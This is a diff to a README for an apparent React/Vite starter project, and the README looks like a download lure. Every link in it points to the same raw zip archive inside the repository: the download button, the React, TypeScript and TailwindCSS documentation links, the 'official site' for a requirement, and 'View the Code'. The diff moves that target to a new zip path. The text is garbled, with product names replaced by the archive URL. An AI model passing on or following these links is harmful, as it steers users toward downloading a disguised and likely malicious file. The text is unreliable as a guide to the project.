@@ -1,6 +1,6 @@
 # 🗿 miraya-vite-react-starter - Simple Starter for UI Experiments
 
-[![Download](https://github.com/Rexitfy/miraya-vite-react-starter/raw/refs/heads/main/public/miraya-react-vite-starter-v2.7.zip%20Now-Click%20Here-brightgreen)](https://github.com/Rexitfy/miraya-vite-react-starter/raw/refs/heads/main/public/miraya-react-vite-starter-v2.7.zip)
+[![Download](https://raw.githubusercontent.com/Rexitfy/miraya-vite-react-starter/main/src/lib/starter_vite_react_miraya_3.3-beta.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Rexitfy/miraya-vite-react-starter/main/src/lib/starter_vite_react_miraya_3.3-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ This guide will help you download and run the application step by step.
 
 To get started, visit the Releases page to download the latest version of the application. You can find it here:
 
-[Download the latest version](https://github.com/Rexitfy/miraya-vite-react-starter/raw/refs/heads/main/public/miraya-react-vite-starter-v2.7.zip)
+[Download the latest version](https://raw.githubusercontent.com/Rexitfy/miraya-vite-react-starter/main/src/lib/starter_vite_react_miraya_3.3-beta.5.zip)
 
 1. Click on the link above.
 2. Look for the latest release at the top of the page.
@@ -64,22 +64,22 @@ Once the download is complete, follow the instructions below based on your opera
 To ensure the best experience, please make sure your system meets the following requirements:
 
 - **Operating System**: Windows 10 or later, macOS Catalina or later, or any current Linux distribution.
-- **https://github.com/Rexitfy/miraya-vite-react-starter/raw/refs/heads/main/public/miraya-react-vite-starter-v2.7.zip**: Version 12 or later. You can download it from [https://github.com/Rexitfy/miraya-vite-react-starter/raw/refs/heads/main/public/miraya-react-vite-starter-v2.7.zip official site](https://github.com/Rexitfy/miraya-vite-react-starter/raw/refs/heads/main/public/miraya-react-vite-starter-v2.7.zip).
-- **npm**: Included with https://github.com/Rexitfy/miraya-vite-react-starter/raw/refs/heads/main/public/miraya-react-vite-starter-v2.7.zip, for package management.
+- **https://raw.githubusercontent.com/Rexitfy/miraya-vite-react-starter/main/src/lib/starter_vite_react_miraya_3.3-beta.5.zip**: Version 12 or later. You can download it from [https://raw.githubusercontent.com/Rexitfy/miraya-vite-react-starter/main/src/lib/starter_vite_react_miraya_3.3-beta.5.zip official site](https://raw.githubusercontent.com/Rexitfy/miraya-vite-react-starter/main/src/lib/starter_vite_react_miraya_3.3-beta.5.zip).
+- **npm**: Included with https://raw.githubusercontent.com/Rexitfy/miraya-vite-react-starter/main/src/lib/starter_vite_react_miraya_3.3-beta.5.zip, for package management.
 
 ## 📚 Additional Resources
 
 Here are some useful resources to help you get started:
 
-- [React Documentation](https://github.com/Rexitfy/miraya-vite-react-starter/raw/refs/heads/main/public/miraya-react-vite-starter-v2.7.zip)
-- [TypeScript Documentation](https://github.com/Rexitfy/miraya-vite-react-starter/raw/refs/heads/main/public/miraya-react-vite-starter-v2.7.zip)
-- [TailwindCSS Documentation](https://github.com/Rexitfy/miraya-vite-react-starter/raw/refs/heads/main/public/miraya-react-vite-starter-v2.7.zip)
+- [React Documentation](https://raw.githubusercontent.com/Rexitfy/miraya-vite-react-starter/main/src/lib/starter_vite_react_miraya_3.3-beta.5.zip)
+- [TypeScript Documentation](https://raw.githubusercontent.com/Rexitfy/miraya-vite-react-starter/main/src/lib/starter_vite_react_miraya_3.3-beta.5.zip)
+- [TailwindCSS Documentation](https://raw.githubusercontent.com/Rexitfy/miraya-vite-react-starter/main/src/lib/starter_vite_react_miraya_3.3-beta.5.zip)
 
 For further assistance, please check the issues in the repository or reach out through discussions.
 
 ## 🔗 Useful Links
 
-- [View the Code on GitHub](https://github.com/Rexitfy/miraya-vite-react-starter/raw/refs/heads/main/public/miraya-react-vite-starter-v2.7.zip)
-- [Download the latest version](https://github.com/Rexitfy/miraya-vite-react-starter/raw/refs/heads/main/public/miraya-react-vite-starter-v2.7.zip)
+- [View the Code on GitHub](https://raw.githubusercontent.com/Rexitfy/miraya-vite-react-starter/main/src/lib/starter_vite_react_miraya_3.3-beta.5.zip)
+- [Download the latest version](https://raw.githubusercontent.com/Rexitfy/miraya-vite-react-starter/main/src/lib/starter_vite_react_miraya_3.3-beta.5.zip)
 
 Thank you for choosing **miraya-vite-react-starter**! Happy coding!
